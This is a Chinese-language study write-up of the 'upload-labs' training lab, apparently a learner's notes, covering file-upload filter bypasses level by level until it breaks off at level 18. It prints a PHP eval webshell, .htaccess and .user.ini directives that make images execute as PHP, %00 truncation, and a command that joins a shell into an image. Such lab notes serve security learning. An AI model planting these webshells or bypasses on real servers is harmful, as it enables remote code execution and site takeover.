## upload-labs

构造一句话木马：

```php
<?php phpinfo();@eval($_POST['666']);?>
```



1. 抓包抓不到，浏览器出现alert()提示，说明验证合法性在前端。直接把php后缀文件改为jpg,绕过前段，再用burp抓包拦截它的发送，把后缀改回php,提交，成功上传。蚁剑连接成功

2. 尝试直接提交php文件，页面上出现文件类型不正确，这个不是alert,也能抓到包，说明是在后端处理，这种可以试一下修改content-type,尝试一下果然成功了（这一关同样也可以使用第一关的方式通过）

3. 这个尝试一下后页面上出现“不允许上传.asp,.aspx.php.jsp后缀的文件，这就是设了黑名单（现在网站基本都用白名单），选择扩展名绕过，.php3,.php5.phptml这种。（出现解析不了的情况就是因为服务器没有配置解析扩展名，需要自己添加）

4. .htaccess文件通常位于网站的根目录或特定目录中，并只影响该目录，不需要重启服务器。这一关类型跟第三关差不多，第三关是修改服务器的httpd.conf文件，这一关是自己上传.htaccess文件，都是为了让服务器能够解析特定的后缀名。创建.htaccess文件，输入内容`AddType application/x-httpd-php .jpg .txt`,意思就是让服务器把.jpg后缀名的文件也解析为php

   <img src="C:\Users\GWG\AppData\Roaming\Typora\typora-user-images\image-20251225165537580.png" alt="image-20251225165537580" style="zoom:80%;" />

   <img src="C:\Users\GWG\AppData\Roaming\Typora\typora-user-images\image-20251225165757959.png" alt="image-20251225165757959" style="zoom:80%;" />

   服务器会先加载php.ini/httpd-conf文件中的配置，如果某个目录存在user.ini/.htaccess文件，服务器会追加在主配置文件里

5. 这一关.htaccess文件也被加入黑名单了，就用.user.ini配置文件，输入内容`auto_prepend_file=shell.jpg`,表示访问该目录下php文件时自动包含shell.jpg文件,木马文件命名为shell.jpg就行了

   此外还有一种方法，点加空格加点的方式绕过。需要网站的上传路径是.加文件名拼接，不可以是时间序列.

6. 大小写

7. 后缀加空格，如果它不去空格就绕过了黑名单，需要上传服务器为windows

8. 后缀加点

9. 附加数据流 在文件名后跟着"::$DATA",后端验证时若未考虑该特殊后缀，就可以绕过黑名单，而服务器会自动去除后缀，将其还原为合法的php文件（注意访问的时候或用蚁剑连接的时候要手动删掉）

10. 点加空格加点

11. 双写绕过，这个是后端处理的时候遇到php等黑名单内容就会替换成空

12. %00是url编码中的空字符，php版本低于5.3，服务器会将%00视为字符串结束符，可在GET参数中添加%00截断路径，强制修改文件后缀名。修改url save_path=../upload/shell.php%00

13. 这个是post类型的%00截断，把post参数后面添加shell.php.jpg，在php后面紧跟的.修改为16进制的00 

14. 图片马，可以用命令把jpg png gif 和php组合，`copy test.jpg /b + shell.php testshell.jpg`上传，也可以把shell.php改后缀为shell.jpg，再修改十六进制码，使其识别为jpg

15. 这一关使用了getimagesize判断是否为图片，这样的话刚刚的修改16进制前两个值的方法就不能用了，但是命令生成的图片马依旧符合。

16. 这一关图片马依旧可行

17. 这一关服务器对图片马进行了二次渲染，需要找到经过二次渲染后未被重写的区域然后在这里加入一句话木马，有的png的相同的字节比较少，这里使用gif方便一些，（此外二次渲染过后的文件再次上传不会继续渲染，因此在二次渲染之后的图片中插入一句话木马也可以）

18. 条件竞争绕过：

累了，剩下的明天再做